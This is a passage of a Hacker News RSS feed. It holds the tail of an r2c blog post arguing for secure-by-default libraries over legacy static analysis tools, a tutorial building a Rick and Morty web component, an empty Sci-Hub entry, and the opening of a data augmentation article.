<p>It would take a few years, and off-the-record conversations with security engineers from dozens of companies, but eventually I found some answers.</p>
<h2>Static analysis in the real world‚Ñ¢</h2>
<p>As a security consultant performing penetration tests, I quickly saw why we preferred <code>grep</code>: </p>
<ul>
<li>Above all, consultants are <em>time limited</em> - they need to find bugs yesterday, and don‚Äôt have time to set up tools, run multi hour scans, and triage hundreds of false positives. Any tool needs to a) be useful out of the box, b) be able to get up and running in minutes, and c) provide real value.</li>
<li>Consultants rarely receive source code in buildable form, which is required by many tools. Again, a consultant <em>could</em> in theory work to build the source code, but that could easily become a time sink that wastes valuable testing time.</li>
<li>Most commercial static analysis tools have licensing models that make consultant use infeasible. Companies may charge by lines of code scanned, number of repos or developers, or some other factor that either doesn‚Äôt make sense or is cost prohibitive for lean consulting firms.</li>
<li>Most commercial static analysis tools are hard to customize - if there‚Äôs a code-base specific anti-pattern or bug class you‚Äôd like to find, writing and validating a custom check might take hours. That is, once you‚Äôve already put in hours or days learning how to write custom rules in the first place.</li>
</ul>
<p>But what was keeping <em>companies</em>, with bigger teams and more time and budget, from embracing static analysis?</p>
<h3>Legacy SAST: slow, noisy, and out of touch</h3>
<p>During my final few years at NCC Group, I was fortunate to have the opportunity to moderate DevSecOps focused panels all around the world featuring senior security leaders from companies including Netflix, Dropbox, Apple, Slack, Datadog, Etsy, DocuSign, and more.</p>
<p>And as a security consultant, I led a number of projects around helping companies scale their AppSec programs, embrace automation, and tune and roll out a SAST tool they had purchased.</p>
<p>Here are a few things I learned:</p>
<ul>
<li>Security teams are tired of tools that deluged them with false positives. They can‚Äôt send results directly to developers without damaging their relationships with engineering, but the small AppSec teams don‚Äôt have time to triage the results.</li>
<li>
<p>Most SAST tools require onboarding and tuning by a domain expert in order to really provide value. Tuning and writing custom rules, despite being high leverage, tend to be complex tasks and require days or weeks of focused time to become competent.</p>
<ul>
<li>I was willing to put in that time because it was a topic I already had interest and a background in, but for most AppSec teams, they don‚Äôt have this in-house expertise and/or there are other more pressing matters-- they can‚Äôt dedicate one of their headcount for a few weeks to become proficient in the tool. Thus many SAST installations languish.</li>
</ul>
</li>
<li>Many SAST buyers (e.g., heads of AppSec or CISOs) <em>didn‚Äôt</em> <em>actually expect</em> the tool to provide security value, but rather were buying it to tick a compliance checkbox. This (initially) surprised but saddened me.</li>
<li>Due to the price and complexity of customization, even very advanced, forward thinking AppSec teams were rolling their own static analysis solutions - which were often collections of regexes!</li>
<li>Most importantly, AppSec teams were starting to <strong>view security differently</strong>. More on this below.</li>
</ul>
<p>Some anecdotes:</p>
<ul>
<li>
<p>A mid-sized, rapidly growing startup said they had paid around $150,000 for a popular SAST tool whose output was <em>1 medium severity issue</em> in the past year.</p>
<ul>
<li>I considered asking them to pay me $150K and then I‚Äôd manually test until I found 1 medium severity issue and then leave, but unfortunately I did not.</li>
</ul>
</li>
<li>
<p>In our off-the-record <a href="https://appsecus2018.sched.com/event/GkdM/empowering-modern-development-with-security-automation-trials-and-tribulations-from-the-trenches" target="_blank" rel="noopener">AppSec USA 2018 panel</a>, my friend Zane Lackey asked the audience, ‚ÄúWho here is happy with their current SAST solution?‚Äù In a standing room only conference room with a few hundred people, not a single person raised their hand.</p>
<ul>
<li>A senior sales professional at one of the big vendors came up to Zane afterwards and had some strong opinions on why their product was useful üòÖ</li>
</ul>
</li>
</ul>
<p>The <strong>biggest thing</strong> that stuck out to me though, after spending hundreds to thousands of hours in this space, both sounds obvious but is perhaps initially unintuitive:</p>
<blockquote>
<p>It‚Äôs <strong>impossible</strong> to find every bug, no matter how advanced your tools are. Instead, the <strong>key to scaling security</strong> is to build <strong>secure-by-default libraries</strong> and tools that developers can use to prevent entire classes of vulnerabilities by construction, and then <strong>make sure developers use them</strong>.</p>
</blockquote>
<p>This is what forward-thinking security teams at companies like Google, Microsoft, Facebook, Netflix, Dropbox, and more believe and have been investing in for <em>years *(see our Global AppSec SF 2020 <a href="https://r2c.dev/global-appsec-sf-2020" target="_blank" rel="noopener">slides</a> for more details and examples</em>)*.</p>
<p>This is not to say that bug finding (manually or with tools) doesn‚Äôt have a role, because it does, but rather that it‚Äôs not the highest leverage area security teams can invest in.</p>
<h3>A crisis of faith</h3>
<p>At this point I began to question my own goals, personal priorities, and beliefs about security in general - was I really pushing the industry forward, manually finding bugs in different applications?</p>
<p>It was also painful continually seeing companies pay so much for solutions they were unhappy with.</p>
<h2>Enter: r2c</h2>
<p>Naively, I started building my own static analysis tool - something simple and lightweight that fits easily into how modern security teams work. However, I soon found that building and maintaining a production quality tool yourself is A Lot of Work‚Ñ¢.</p>
<p>In a random stroke of luck, my friend from grad school, <a href="https://twitter.com/defreez" target="_blank" rel="noopener">Daniel DeFreez</a>, told me about this small, SF-based startup called r2c, who were also building a lightweight static analysis tool.</p>
<p>I grabbed lunch with the team and attended a few of their meetups, and was surprised to find how closely our views of the future of security were aligned.</p>
<p>One day I said to Isaac, one of r2c‚Äôs co-founders and CEO, ‚ÄúYou know, I think you should hire for a role like <code>&lt;this&gt;</code>,‚Äù and proceeded to pitch him my dream role, which was an unusual blend of everything: being a pro user of the product and influencing product direction, working closely with marketing to create and share security research that meaningfully pushes the industry forward, and much more.</p>
<p>To my surprise, he chatted with the team, and they ended up agreeing! üòç</p>
<h2>Why I joined r2c</h2>
<p>I joined r2c primarily for two reasons: </p>
<ol>
<li>I believed they were on an ideal trajectory for helping shape the future of AppSec, and </li>
<li>I was impressed by the quality of the team and its culture.</li>
</ol>
<p>Let‚Äôs get into both in a bit more detail.</p>
<h3>The future of AppSec: killing bug classes via secure defaults</h3>
<p>This topic merits its own post (and maybe blog series), but I wanted to at least touch on it here. For more info, see Isaac and I‚Äôs Global AppSec SF 2020 <a href="https://r2c.dev/global-appsec-sf-2020" target="_blank" rel="noopener">slides.</a></p>
<p>Historically, the security industry has focused on vulnerability identification, via pen testing, bug bounty, SAST, DAST, internal testing, and more. However, this is reactive and in general doesn‚Äôt prevent future vulnerabilities from being introduced.</p>
<p>However, there have been some promising developments - modern web frameworks like Django, Ruby on Rails, and others have a number of secure defaults and built-in guardrails that make potentially dangerous tasks safe by default, including context sensitive output encoding (prevent XSS), tight integration with object relational mappers (prevent SQL injection), and more. In my and many others‚Äô opinions, <em>this</em> is why overall web security has improved, not all of the fancy bug finding tools we‚Äôve built.</p>
<p>Forward thinking security teams at companies like Google, Microsoft, Facebook, Microsoft, Netflix, Dropbox, and many others have gone even further than what‚Äôs provided out of the box in common frameworks, creating secure libraries for parsing XML, authentication and authorization, mutual TLS between services, secret management, and many more.</p>
<blockquote>
<p>The future of AppSec is a one-two punch of secure defaults + lightweight enforcement of those defaults.</p>
</blockquote>
<p>That way developers can do what they do best: rapidly build scalable, complex software that brings business value to your customers, and not have to constantly be wary of all of the subtle nuances that could lead to a vulnerability.  In an ideal world, <strong>security should be completely transparent to developers</strong>.</p>
<p>By being fast, easily customizable, and open ‚Ä¶</p></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://r2c.dev/blog/2020/future-of-appsec-why-r2c/">https://r2c.dev/blog/2020/future-of-appsec-why-r2c/</a></em></p>]]>
            </description>
            <link>https://r2c.dev/blog/2020/future-of-appsec-why-r2c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932357</guid>
            <pubDate>Thu, 29 Oct 2020 16:37:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's the heck is web components]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24932340">thread link</a>) | @soubai
<br/>
October 29, 2020 | https://www.soubai.me/posts/whats-the-heck-is-web-components | <a href="https://web.archive.org/web/*/https://www.soubai.me/posts/whats-the-heck-is-web-components">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this blog post I will try to demystify the web component concept for you and we‚Äôll create a simple web component as a demo</p>
<h2 id="what-is-component-react-as-an-example-"><a href="#what-is-component-react-as-an-example-" aria-label="what is component react as an example  permalink"></a>What is Component (React as an example) ?</h2>
<p>Let‚Äôs take react as an example, react is a great frontend library focused on building UI (user interfaces) quickly and efficiently .</p>
<p>To build UI react (and other javascript frontend frameworks) use the components. And here component stands for the building block part for every UI; for example we have a dashboard page with a navbar, sidebar, chart‚Ä¶ every part of UI elements is a component moreover the page is one big component includes all other ones and act as a container.</p>
<p><span>
      <a href="https://www.soubai.me/static/776811a777044b1d2d2bf6c834785392/26df7/react-component-tree.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://www.soubai.me/static/776811a777044b1d2d2bf6c834785392/8ac56/react-component-tree.webp 240w,
https://www.soubai.me/static/776811a777044b1d2d2bf6c834785392/d3be9/react-component-tree.webp 480w,
https://www.soubai.me/static/776811a777044b1d2d2bf6c834785392/e46b2/react-component-tree.webp 960w,
https://www.soubai.me/static/776811a777044b1d2d2bf6c834785392/a9a89/react-component-tree.webp 1024w" sizes="(max-width: 960px) 100vw, 960px" type="image/webp">
        <source srcset="https://www.soubai.me/static/776811a777044b1d2d2bf6c834785392/e4891/react-component-tree.png 240w,
https://www.soubai.me/static/776811a777044b1d2d2bf6c834785392/0ce91/react-component-tree.png 480w,
https://www.soubai.me/static/776811a777044b1d2d2bf6c834785392/b7c40/react-component-tree.png 960w,
https://www.soubai.me/static/776811a777044b1d2d2bf6c834785392/26df7/react-component-tree.png 1024w" sizes="(max-width: 960px) 100vw, 960px" type="image/png">
        <img src="https://www.soubai.me/static/776811a777044b1d2d2bf6c834785392/b7c40/react-component-tree.png" alt="react component tree" title="react component tree" loading="lazy">
      </picture>
  </a>
    </span></p>
<p>In react to create a component we have two ways :</p>
<ol>
<li>function-based component:  where the component is a function </li>
<li>class-based component: where the component  is a class extending <code>React.Component</code></li>
</ol>
<p>each one has pros and cons (React team is pushing to use functional components in the newest versions)</p>
<p>So what are web components and why we need them if we already have javascript frameworks?</p>
<h2 id="web-component"><a href="#web-component" aria-label="web component permalink"></a>Web Component:</h2>
<p>Web components are a set of <strong>web platform APIs</strong> that allows you to create new custom, reusable, encapsulated HTML tags to use in web pages and web apps.</p>
<p>In easy words we don‚Äôt need javascript framework to create components we can use vanilla javascript to define our custom HTML elements while maintaining the encapsulation and reusability.</p>
<h3 id="web-components-specifications"><a href="#web-components-specifications" aria-label="web components specifications permalink"></a>Web components specifications:</h3>
<p>According to <a href="https://developer.mozilla.org/en-US/docs/Web/Web_Components" target="_blank" rel="nofollow noopener noreferrer">MDN</a> web components are: </p>
<blockquote>
<p>Suite of different technologies allowing you to create reusable custom elements ‚Äî with their functionality encapsulated away from the rest of your code ‚Äî and utilize them in your web apps.</p>
</blockquote>
<p>those set of techos are the specifications to define valid web components :</p>
<ol>
<li>
<p><strong>Custom Elements</strong>: The Custom Elements specification lays the foundation for designing and using new types of DOM elements.
<span>
      <a href="https://www.soubai.me/static/3a14151423e7ab121a4fe203a1138a00/e585c/unnamed-2-.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://www.soubai.me/static/3a14151423e7ab121a4fe203a1138a00/8ac56/unnamed-2-.webp 240w,
https://www.soubai.me/static/3a14151423e7ab121a4fe203a1138a00/d3be9/unnamed-2-.webp 480w,
https://www.soubai.me/static/3a14151423e7ab121a4fe203a1138a00/bd5dd/unnamed-2-.webp 512w" sizes="(max-width: 512px) 100vw, 512px" type="image/webp">
        <source srcset="https://www.soubai.me/static/3a14151423e7ab121a4fe203a1138a00/e4891/unnamed-2-.png 240w,
https://www.soubai.me/static/3a14151423e7ab121a4fe203a1138a00/0ce91/unnamed-2-.png 480w,
https://www.soubai.me/static/3a14151423e7ab121a4fe203a1138a00/e585c/unnamed-2-.png 512w" sizes="(max-width: 512px) 100vw, 512px" type="image/png">
        <img src="https://www.soubai.me/static/3a14151423e7ab121a4fe203a1138a00/e585c/unnamed-2-.png" alt="unnamed 2 " title="unnamed 2 " loading="lazy">
      </picture>
  </a>
    </span></p>
<blockquote>
<p>Allow you to define custom elements and their behavior</p>
</blockquote>
</li>
<li>
<p><strong>Shadow DOM</strong>: The shadow DOM specification defines how to use encapsulated style and markup in web components.
<span>
      <a href="https://www.soubai.me/static/c766441d648d46e53ec9150dc9caf94e/e585c/unnamed-3-.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://www.soubai.me/static/c766441d648d46e53ec9150dc9caf94e/8ac56/unnamed-3-.webp 240w,
https://www.soubai.me/static/c766441d648d46e53ec9150dc9caf94e/d3be9/unnamed-3-.webp 480w,
https://www.soubai.me/static/c766441d648d46e53ec9150dc9caf94e/bd5dd/unnamed-3-.webp 512w" sizes="(max-width: 512px) 100vw, 512px" type="image/webp">
        <source srcset="https://www.soubai.me/static/c766441d648d46e53ec9150dc9caf94e/e4891/unnamed-3-.png 240w,
https://www.soubai.me/static/c766441d648d46e53ec9150dc9caf94e/0ce91/unnamed-3-.png 480w,
https://www.soubai.me/static/c766441d648d46e53ec9150dc9caf94e/e585c/unnamed-3-.png 512w" sizes="(max-width: 512px) 100vw, 512px" type="image/png">
        <img src="https://www.soubai.me/static/c766441d648d46e53ec9150dc9caf94e/e585c/unnamed-3-.png" alt="unnamed 3 " title="unnamed 3 " loading="lazy">
      </picture>
  </a>
    </span></p>
<blockquote>
<p>Allow you to attach an encapsulated ‚Äúshadow‚Äù DOM tree to an element</p>
</blockquote>
</li>
<li><strong>ES Modules</strong>: The ES Modules specification defines the inclusion and    reuse of JS documents in a standards-based,
modular, performant way.
</li>
</ol>
<p><span>
      <a href="https://www.soubai.me/static/8a5d3fac84af4f8f241d2ebd009b49d0/89581/pasted-image-0.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://www.soubai.me/static/8a5d3fac84af4f8f241d2ebd009b49d0/8ac56/pasted-image-0.webp 240w,
https://www.soubai.me/static/8a5d3fac84af4f8f241d2ebd009b49d0/d3be9/pasted-image-0.webp 480w,
https://www.soubai.me/static/8a5d3fac84af4f8f241d2ebd009b49d0/e46b2/pasted-image-0.webp 960w,
https://www.soubai.me/static/8a5d3fac84af4f8f241d2ebd009b49d0/f9357/pasted-image-0.webp 1110w" sizes="(max-width: 960px) 100vw, 960px" type="image/webp">
        <source srcset="https://www.soubai.me/static/8a5d3fac84af4f8f241d2ebd009b49d0/e4891/pasted-image-0.png 240w,
https://www.soubai.me/static/8a5d3fac84af4f8f241d2ebd009b49d0/0ce91/pasted-image-0.png 480w,
https://www.soubai.me/static/8a5d3fac84af4f8f241d2ebd009b49d0/b7c40/pasted-image-0.png 960w,
https://www.soubai.me/static/8a5d3fac84af4f8f241d2ebd009b49d0/89581/pasted-image-0.png 1110w" sizes="(max-width: 960px) 100vw, 960px" type="image/png">
        <img src="https://www.soubai.me/static/8a5d3fac84af4f8f241d2ebd009b49d0/b7c40/pasted-image-0.png" alt="pasted image 0" title="pasted image 0" loading="lazy">
      </picture>
  </a>
    </span></p>
<blockquote>
<p>ECMAScript standard for working with modules. While Node.js has been using the CommonJS standard for years, the browser never had a module system</p>
</blockquote>
<ol start="4">
<li><strong>HTML Template</strong>: The HTML template element specification defines how to declare fragments of markup that go unused on page load, but can be instantiated later on at runtime.</li>
</ol>
<p> <span>
      <a href="https://www.soubai.me/static/98877ec9037b336f82511a68f561a670/e585c/unnamed-1-.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://www.soubai.me/static/98877ec9037b336f82511a68f561a670/8ac56/unnamed-1-.webp 240w,
https://www.soubai.me/static/98877ec9037b336f82511a68f561a670/d3be9/unnamed-1-.webp 480w,
https://www.soubai.me/static/98877ec9037b336f82511a68f561a670/bd5dd/unnamed-1-.webp 512w" sizes="(max-width: 512px) 100vw, 512px" type="image/webp">
        <source srcset="https://www.soubai.me/static/98877ec9037b336f82511a68f561a670/e4891/unnamed-1-.png 240w,
https://www.soubai.me/static/98877ec9037b336f82511a68f561a670/0ce91/unnamed-1-.png 480w,
https://www.soubai.me/static/98877ec9037b336f82511a68f561a670/e585c/unnamed-1-.png 512w" sizes="(max-width: 512px) 100vw, 512px" type="image/png">
        <img src="https://www.soubai.me/static/98877ec9037b336f82511a68f561a670/e585c/unnamed-1-.png" alt="unnamed 1 " title="unnamed 1 " loading="lazy">
      </picture>
  </a>
    </span></p>
<blockquote>
<p>The <code>&lt;template&gt;</code> and <code>&lt;slot&gt;</code> elements enable you to write markup templates that are not displayed in the rendered page. These can then be reused multiple times as the basis of a custom element‚Äôs structure.</p>
</blockquote>
<h3 id="browser-compatibility"><a href="#browser-compatibility" aria-label="browser compatibility permalink"></a>Browser Compatibility</h3>
<p>An important thing that made web components hypes recently is the big adoption/compatibility with the modern browsers so we can use them without polyfills nor a bundlers </p>
<p> <span>
      <a href="https://www.soubai.me/static/ea81b1f32e883bb987da74406bfa0c17/50cab/bc.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://www.soubai.me/static/ea81b1f32e883bb987da74406bfa0c17/8ac56/bc.webp 240w,
https://www.soubai.me/static/ea81b1f32e883bb987da74406bfa0c17/d3be9/bc.webp 480w,
https://www.soubai.me/static/ea81b1f32e883bb987da74406bfa0c17/8b983/bc.webp 768w" sizes="(max-width: 768px) 100vw, 768px" type="image/webp">
        <source srcset="https://www.soubai.me/static/ea81b1f32e883bb987da74406bfa0c17/e4891/bc.png 240w,
https://www.soubai.me/static/ea81b1f32e883bb987da74406bfa0c17/0ce91/bc.png 480w,
https://www.soubai.me/static/ea81b1f32e883bb987da74406bfa0c17/50cab/bc.png 768w" sizes="(max-width: 768px) 100vw, 768px" type="image/png">
        <img src="https://www.soubai.me/static/ea81b1f32e883bb987da74406bfa0c17/50cab/bc.png" alt="bc" title="bc" loading="lazy">
      </picture>
  </a>
    </span></p>
<h2 id="demo"><a href="#demo" aria-label="demo permalink"></a>Demo</h2>
<p>I‚Äôll create  a web component to load Rick &amp; Morty charcters from rest API</p>
<div data-language="js"><pre><code>
<span>class</span> <span>RMCharacter</span> <span>extends</span> <span>HTMLElement</span> <span>{</span>

    
    <span>static</span> <span>get</span> <span>observedAttributes</span><span>(</span><span>)</span> <span>{</span> <span>return</span> <span>[</span><span>'name'</span><span>]</span><span>;</span> <span>}</span>

    
    <span>constructor</span><span>(</span><span>)</span> <span>{</span>
        <span>super</span><span>(</span><span>)</span>
        
        <span>this</span><span>.</span>shadowDOM <span>=</span> <span>this</span><span>.</span><span>attachShadow</span><span>(</span><span>{</span> mode<span>:</span> <span>'open'</span> <span>}</span><span>)</span><span>;</span>
        <span>this</span><span>.</span>shadowDOM<span>.</span>innerHTML <span>=</span> <span><span>`</span><span>
        &lt;style&gt;
            h3 {
            color : red
        }
        &lt;/style&gt;
        </span><span>`</span></span>
    <span>}</span>

    
    <span>async</span> <span>connectedCallback</span><span>(</span><span>)</span> <span>{</span>

        
        <span>let</span> data <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>"https://rickandmortyapi.com/api/character/?name="</span> <span>+</span> <span>this</span><span>.</span>name<span>)</span>
        <span>let</span> <span>{</span> results <span>}</span> <span>=</span> <span>await</span> data<span>.</span><span>json</span><span>(</span><span>)</span>
        
        <span>const</span> warpper <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"div"</span><span>)</span>
        <span>const</span> img <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"img"</span><span>)</span>
        <span>const</span> name <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"h3"</span><span>)</span>
        
        img<span>.</span><span>setAttribute</span><span>(</span><span>"src"</span><span>,</span> results<span>[</span><span>0</span><span>]</span><span>.</span>image<span>)</span>
        name<span>.</span>innerText <span>=</span> results<span>[</span><span>0</span><span>]</span><span>.</span>name
        warpper<span>.</span><span>appendChild</span><span>(</span>name<span>)</span>
        warpper<span>.</span><span>appendChild</span><span>(</span>img<span>)</span>
        
        <span>this</span><span>.</span>shadowDOM<span>.</span><span>appendChild</span><span>(</span>warpper<span>)</span>
    <span>}</span>

    

    <span>attributeChangedCallback</span><span>(</span><span>attributeName<span>,</span> oldValue<span>,</span> newValue</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>attributeName <span>===</span> <span>"name"</span> <span>&amp;&amp;</span> oldValue <span>!==</span> newValue<span>)</span> <span>{</span>

            <span>this</span><span>.</span>name <span>=</span> newValue

        <span>}</span>
    <span>}</span>
<span>}</span>



window<span>.</span>customElements<span>.</span><span>define</span><span>(</span><span>'rm-character'</span><span>,</span> RMCharacter<span>)</span></code></pre></div>
<div data-language="html"><pre><code><span>&lt;!DOCTYPE html&gt;</span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>&gt;</span></span>
<span><span><span>&lt;</span>head</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>UTF-8<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1.0<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>title</span><span>&gt;</span></span>Document<span><span><span>&lt;/</span>title</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span>
        <span>h3</span> <span>{</span>
            <span>color</span><span>:</span> green
        <span>}</span>
    </span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span>
<span><span><span>&lt;/</span>head</span><span>&gt;</span></span>
<span><span><span>&lt;</span>body</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>h3</span><span>&gt;</span></span>My<span><span><span>&lt;/</span>h3</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>rm-character</span> <span>name</span><span><span>=</span><span>"</span>Rick Sanchez<span>"</span></span><span>&gt;</span></span><span><span><span>&lt;/</span>rm-character</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>rm-character</span> <span>name</span><span><span>=</span><span>"</span>morty<span>"</span></span><span>&gt;</span></span><span><span><span>&lt;/</span>rm-character</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>script</span> <span>type</span><span><span>=</span><span>"</span>module<span>"</span></span> <span>src</span><span><span>=</span><span>"</span>index.js<span>"</span></span><span>&gt;</span></span><span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span>
<span><span><span>&lt;/</span>body</span><span>&gt;</span></span>
<span><span><span>&lt;/</span>html</span><span>&gt;</span></span></code></pre></div>
<p>And the result is something like this :</p>
<p><span>
      <a href="https://www.soubai.me/static/6d2dbdb63c7a33bff244f09e6ed1d055/f1d59/sreenshot-demo.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://www.soubai.me/static/6d2dbdb63c7a33bff244f09e6ed1d055/8ac56/sreenshot-demo.webp 240w,
https://www.soubai.me/static/6d2dbdb63c7a33bff244f09e6ed1d055/d3be9/sreenshot-demo.webp 480w,
https://www.soubai.me/static/6d2dbdb63c7a33bff244f09e6ed1d055/c71bf/sreenshot-demo.webp 721w" sizes="(max-width: 721px) 100vw, 721px" type="image/webp">
        <source srcset="https://www.soubai.me/static/6d2dbdb63c7a33bff244f09e6ed1d055/e4891/sreenshot-demo.png 240w,
https://www.soubai.me/static/6d2dbdb63c7a33bff244f09e6ed1d055/0ce91/sreenshot-demo.png 480w,
https://www.soubai.me/static/6d2dbdb63c7a33bff244f09e6ed1d055/f1d59/sreenshot-demo.png 721w" sizes="(max-width: 721px) 100vw, 721px" type="image/png">
        <img src="https://www.soubai.me/static/6d2dbdb63c7a33bff244f09e6ed1d055/f1d59/sreenshot-demo.png" alt="sreenshot demo" title="sreenshot demo" loading="lazy">
      </picture>
  </a>
    </span></p>
<p>As you can see we create a custom, reusable, encapsulated HTML element easily with web component specifications and this element can be re-used with any kind of frontend technologies (vanilla, jquery, javascript framework..) and within the same project or cross-projects </p>
<h2 id="whats-next-"><a href="#whats-next-" aria-label="whats next  permalink"></a>What‚Äôs next :</h2>
<p>Check this resources and tools :</p>
<ul>
<li>Polymer (Backed by Google)</li>
<li>Stencil (Backed by Ionic)</li>
<li>Skate.js (Works with other frameworks )</li>
<li>Hybrids (UI lin for create WC)</li>
</ul></div></div>]]>
            </description>
            <link>https://www.soubai.me/posts/whats-the-heck-is-web-components</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932340</guid>
            <pubDate>Thu, 29 Oct 2020 16:35:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Large inequality in international energy footprints between income groups]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24932205">thread link</a>) | @tonyedgecombe
<br/>
October 29, 2020 | https://sci-hub.tf/10.1038/s41560-020-0579-8 | <a href="https://web.archive.org/web/*/https://sci-hub.tf/10.1038/s41560-020-0579-8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sci-hub.tf/10.1038/s41560-020-0579-8</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932205</guid>
            <pubDate>Thu, 29 Oct 2020 16:25:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Augmentation in Python: Everything You Need to Know]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24932171">thread link</a>) | @patrycjaneptune
<br/>
October 29, 2020 | https://neptune.ai/blog/data-augmentation-in-python | <a href="https://web.archive.org/web/*/https://neptune.ai/blog/data-augmentation-in-python">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <article class="page">
	
<p>In machine learning (<strong>ML</strong>), if the situation when the model does not generalize well from the training data to unseen data is called <strong>overfitting</strong>. As you might know, it is one of the trickiest obstacles in applied machine learning.&nbsp;</p>



<p>The first step in tackling this problem is to actually know that your model is <strong>overfitting<em>. </em></strong>That is where proper <a href="https://neptune.ai/blog/cross-validation-in-machine-learning-how-to-do-it-right" target="_blank" rel="noreferrer noopener nofollow">cross-validation</a> comes in.</p>



<p>After identifying the problem you can prevent it from happening by applying regularization or training with more data. Still, sometimes you might not have additional data to add to your initial dataset. Acquiring and labeling additional data points may also be the wrong path. Of course, in many cases, it will deliver better results, but in terms of work, it is time-consuming and expensive a lot of the time.</p>



<p>That is where <a href="https://www.techopedia.com/definition/28033/data-augmentation" target="_blank" rel="noreferrer noopener nofollow"><strong>Data Augmentation</strong></a> (<strong>DA</strong>) comes in.</p>



<p>In this article we will cover:</p>



<ul><li>What is <strong>Data Augmentation</strong> ‚Äì definition, the purpose of use, and techniques</li><li>Built-in augmentation methods in <strong>DL</strong> frameworks ‚Äì <strong>TensorFlow</strong>, <strong>Keras</strong>, <strong>PyTorch</strong>, <strong>MxNet</strong></li><li>Image <strong>DA</strong> libraries ‚Äì <strong>Augmentor</strong>, <strong>Albumentations</strong>, <strong>ImgAug</strong>, <strong>AutoAugment</strong>, <strong>Transforms</strong></li><li>Speed comparison of these libraries&nbsp;</li><li><strong>Best practices</strong>, tips, and tricks&nbsp;</li></ul>






<h2>What is Data Augmentation</h2>



<p><strong>Data Augmentation</strong> is a technique that can be used to artificially expand the size of a training set by creating modified data from the existing one. It is a good practice to use <strong>DA</strong> if you want to prevent <strong>overfitting</strong>, or the initial dataset is too small to train on, or even if you want to squeeze better performance from your model.</p>



<div><p>Let‚Äôs make this clear, <strong>Data Augmentation</strong> is not only used to prevent <strong>overfitting</strong>. In general, having a large dataset is crucial for the performance of both <strong>ML</strong> and <strong>Deep Learning</strong> (<strong>DL</strong>) models. However, we can improve the performance of the model by augmenting the data we already have. It means that <strong>Data Augmentation</strong> is also good for enhancing the model‚Äôs performance.</p><p>In general, <strong>DA</strong> is frequently used when building a <strong>DL</strong> model. That is why throughout this article we will mostly talk about performing <strong>Data Augmentation</strong> with various <strong>DL</strong> frameworks. Still, you should keep in mind that you can augment the data for the <strong>ML</strong> problems as well.</p></div>



<p>You can augment:</p>



<ol><li>Audio</li><li>Text</li><li>Images</li><li>Any other types of data</li></ol>



<p>We will focus on image augmentations as those are the most popular ones. Nevertheless, augmenting other types of data is as efficient and easy. That is why it‚Äôs good to remember some common techniques which can be performed to augment the data.</p>



<h3><strong>Data Augmentation techniques</strong></h3>



<p>We can apply various changes to the initial data. For example, for images we can use:</p>



<ol><li><strong>Geometric transformations</strong> ‚Äì you can randomly flip, crop, rotate or translate images, and that is just the tip of the iceberg</li><li><strong>Color space transformations</strong> ‚Äì change RGB color channels, intensify any color</li><li><strong>Kernel filters</strong> ‚Äì sharpen or blur an image&nbsp;</li><li><strong>Random Erasing</strong> ‚Äì delete a part of the initial image</li><li><strong>Mixing images</strong> ‚Äì basically, mix images with one another. Might be counterintuitive but it works</li></ol>



<p>For text there are:</p>



<ol><li><strong>Word/sentence shuffling</strong></li><li><strong>Word replacement</strong> ‚Äì replace words with synonyms</li><li><strong>Syntax-tree manipulation</strong> ‚Äì paraphrase the sentence to be grammatically correct using the same words</li><li>Other described in the article about <a href="https://neptune.ai/blog/data-augmentation-nlp" target="_blank" rel="noreferrer noopener nofollow">Data Augmentation in NLP</a></li></ol>



<p>For audio augmentation you can use:</p>



<ol><li><strong>Noise injection</strong></li><li><strong>Shifting</strong></li><li><strong>Changing the speed of the tape</strong></li><li>And many more</li></ol>



<p>Moreover, the greatest advantage of the augmentation techniques is that you may use all of them at once. Thus, you may get plenty of unique samples of data from the initial one.</p>






<h2>Data Augmentation in Deep Learning</h2>



